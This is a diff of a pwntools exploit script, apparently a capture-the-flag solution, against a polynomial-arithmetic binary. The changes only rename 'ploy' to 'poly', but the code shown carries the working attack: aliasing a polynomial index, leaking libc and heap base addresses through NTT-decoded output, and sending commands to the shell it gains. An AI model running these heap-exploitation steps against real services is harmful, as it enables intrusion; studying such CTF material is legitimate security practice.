@@ -8,15 +8,15 @@ from pwn import *
 MOD = 2281701377
 PRIMITIVE_ROOT = 3
 STREAM_FLUSH_LIMIT = 0x20000
-PLOY_COUNT = 0x40
+POLY_COUNT = 0x40
 U8_INDEX_COUNT = 0x100
 UINT32_MOD = 1 << 32
 PTR_SIZE = 8
 DEGREE_SIZE = 4
-PLOY_ALIAS_INDEX = U8_INDEX_COUNT - 3
-TARGET = UINT32_MOD - (U8_INDEX_COUNT - PLOY_ALIAS_INDEX)
-PLOY_DEGREES_OFFSET = PLOY_ALIAS_INDEX * (PTR_SIZE - DEGREE_SIZE)
-PLOY_DEGREES_GAP = PLOY_DEGREES_OFFSET - PLOY_COUNT * PTR_SIZE
+POLY_ALIAS_INDEX = U8_INDEX_COUNT - 3
+TARGET = UINT32_MOD - (U8_INDEX_COUNT - POLY_ALIAS_INDEX)
+POLY_DEGREES_OFFSET = POLY_ALIAS_INDEX * (PTR_SIZE - DEGREE_SIZE)
+POLY_DEGREES_GAP = POLY_DEGREES_OFFSET - POLY_COUNT * PTR_SIZE
 TARGET_PTR = TARGET + 1
 TARGET_DEG = TARGET + 2
 VERBOSE_PROGRESS = True
@@ -110,7 +110,7 @@ def ntt(a, invert=False):
             a[i] = (a[i] * n_inv) % MOD
 
 
-class BestploysStream:
+class BestpolysStream:
     def __init__(self, cmd):
         self.cmd = cmd
         self.opt_counts = 0
@@ -154,7 +154,7 @@ class BestploysStream:
     def parse_poly(self, s):
         return [int(c) for c in s.split()]
 
-    def recv_ploy(self):
+    def recv_poly(self):
         self.cmd.flush()
         self.cmd.recvuntil(b" (mod 2281701377):\n")
         return self.parse_poly(self.cmd.recvline().decode())
@@ -167,9 +167,9 @@ class BestploysStream:
 def smoke(sess):
     sess.read_poly(0, 2, [10, 20, 30])
     sess.show_poly(0)
-    ploy = sess.recv_ploy()
-    if ploy != [10, 20, 30]:
-        raise ValueError(f"unexpected smoke result: {ploy!r}")
+    poly = sess.recv_poly()
+    if poly != [10, 20, 30]:
+        raise ValueError(f"unexpected smoke result: {poly!r}")
     sess.flush_top_chunk()
     sess.exit()
     log.success("stream smoke test passed")
@@ -211,30 +211,30 @@ def pwn_stream(sess):
         return wrapper
 
     @log_info_wrapper
-    def make_ploy_without_sync(ploy, dest):
-        p = progress("Making ploy")
+    def make_poly_without_sync(poly, dest):
+        p = progress("Making poly")
         T0 = R[0]
         T1 = R[1]
         sess.add_polys(ZERO, ZERO, T1)
-        for i, coeff in enumerate(ploy[::-1]):
+        for i, coeff in enumerate(poly[::-1]):
             sess.add_polys(ZERO, ZERO, T0)
             for x in range(32):
                 if (coeff >> x) & 1:
                     sess.add_polys(T0, B[x], T0)
             sess.multiply_polys(SHIFT, T1)
             sess.add_polys(T0, T1, T1)
-            p.status(f"Processing coefficient {i} / {len(ploy)}")
+            p.status(f"Processing coefficient {i} / {len(poly)}")
         sess.add_polys(T1, ZERO, dest)
         p.success("Done")
 
     @log_info_wrapper
-    def make_ploy(ploy, dest):
-        make_ploy_without_sync(ploy, dest)
+    def make_poly(poly, dest):
+        make_poly_without_sync(poly, dest)
         sync_out()
 
     @log_info_wrapper
     def make_zero_n_degree_poly(n, dest):
-        p = progress("Making zero n degree ploy")
+        p = progress("Making zero n degree poly")
         T0 = R[0]
         sess.add_polys(ZERO, ZERO, T0)
         for i in range(n - 1):
@@ -246,7 +246,7 @@ def pwn_stream(sess):
 
     @log_info_wrapper
     def make_one_n_degree_poly(n, dest):
-        p = progress("Making one n degree ploy")
+        p = progress("Making one n degree poly")
         T0 = R[0]
         sess.add_polys(ZERO, ZERO, T0)
         for i in range(n - 1):
@@ -256,53 +256,53 @@ def pwn_stream(sess):
         sync_out()
         p.success("Done")
 
-    def bytes2ploy(b):
+    def bytes2poly(b):
         b = b.ljust(0x200, b"\x00")
         res = []
         for i in range(0, len(b), 4):
             res.append(int.from_bytes(b[i:i + 4], "little"))
         return res
 
-    def bytes2ploy_ntt(b):
-        ploy = bytes2ploy(b)
-        ntt(ploy, invert=True)
-        return ploy
+    def bytes2poly_ntt(b):
+        poly = bytes2poly(b)
+        ntt(poly, invert=True)
+        return poly
 
     def make_bytes(b, dest):
-        make_ploy(bytes2ploy_ntt(b), dest)
+        make_poly(bytes2poly_ntt(b), dest)
 
-    def dot_mul(ploy_a, ploy_b):
-        if len(ploy_a) != len(ploy_b):
+    def dot_mul(poly_a, poly_b):
+        if len(poly_a) != len(poly_b):
             raise ValueError("polynomial length mismatch")
-        res = [0] * len(ploy_a)
-        for i, (a, b) in enumerate(zip(ploy_a, ploy_b)):
+        res = [0] * len(poly_a)
+        for i, (a, b) in enumerate(zip(poly_a, poly_b)):
             res[i] = wrap(a * b)
         return res
 
     def mul_bytes(old, b, dest):
-        ploy_old = bytes2ploy(old)
-        ploy_b = bytes2ploy(b)
-        for i in range(len(ploy_old)):
-            if ploy_old[i] != 0:
-                ploy_old[i] = inv(ploy_old[i])
-        ploy = dot_mul(ploy_old, ploy_b)
-        ntt(ploy, invert=True)
-        make_ploy(ploy, dest)
-        log.success(f"result ploy idx: {dest:#x}")
+        poly_old = bytes2poly(old)
+        poly_b = bytes2poly(b)
+        for i in range(len(poly_old)):
+            if poly_old[i] != 0:
+                poly_old[i] = inv(poly_old[i])
+        poly = dot_mul(poly_old, poly_b)
+        ntt(poly, invert=True)
+        make_poly(poly, dest)
+        log.success(f"result poly idx: {dest:#x}")
 
-    def log_ploy(log_func, ploy):
+    def log_poly(log_func, poly):
         s = "\n"
-        for i, coeff in enumerate(ploy):
+        for i, coeff in enumerate(poly):
             s += f"\t[0x{i:02x}] = {coeff:#x}\n"
-        log_func(f"received ploy: {s}")
+        log_func(f"received poly: {s}")
 
     def sync_out():
         sess.show_poly(TRASH)
-        sess.recv_ploy()
+        sess.recv_poly()
         if VERBOSE_PROGRESS:
             log.success("Output synchronized")
 
-    make_ploy([i for i in range(0x3)], TRASH)
+    make_poly([i for i in range(0x3)], TRASH)
 
     make_zero_n_degree_poly(0xf0, R[10])
     sess.multiply_polys(R[10], TARGET)
@@ -320,12 +320,12 @@ def pwn_stream(sess):
     make_one_n_degree_poly(1, R[10])
     sess.multiply_polys(TARGET, R[10])
     sess.show_poly(R[10])
-    ploy = sess.recv_ploy()
-    ntt(ploy, invert=False)
+    poly = sess.recv_poly()
+    ntt(poly, invert=False)
     if VERBOSE_PROGRESS:
-        log_ploy(log.success, ploy)
+        log_poly(log.success, poly)
 
-    leak = ploy[0x75] * 2**32 + ploy[0x74]
+    leak = poly[0x75] * 2**32 + poly[0x74]
     log.success(f"{leak= :#x}")
     libc_base = leak - 0x203f90
     if libc_base & 0xfff != 0:
@@ -333,7 +333,7 @@ def pwn_stream(sess):
     libc_base = leak - 0x203f90
     log.success(f"{libc_base= :#x}")
 
-    leak = ploy[0x79] * 2**32 + ploy[0x78]
+    leak = poly[0x79] * 2**32 + poly[0x78]
     log.success(f"{leak= :#x}")
     heap_base = leak - 0x69b0
     if heap_base & 0xfff != 0:
@@ -422,7 +422,7 @@ def make_io(args):
 
 
 def parse_args():
-    default_bin = Path(__file__).resolve().parents[1] / "source" / "ploys"
+    default_bin = Path(__file__).resolve().parents[1] / "source" / "polys"
     parser = argparse.ArgumentParser()
     parser.add_argument("--local", action="store_true")
     parser.add_argument("--binary", default=str(default_bin))
@@ -451,7 +451,7 @@ def main():
 
     if args.smoke:
         io = make_io(args)
-        sess = BestploysStream(StreamCmd(io))
+        sess = BestpolysStream(StreamCmd(io))
         smoke(sess)
         io.close()
         return
@@ -462,7 +462,7 @@ def main():
         try:
             start_time = time.time()
             io = make_io(args)
-            sess = BestploysStream(StreamCmd(io))
+            sess = BestpolysStream(StreamCmd(io))
             pwn_stream(sess)
             if args.cmd:
                 io.sendline(b"echo SHELL_OK; " + args.cmd.encode() + b"; exit")
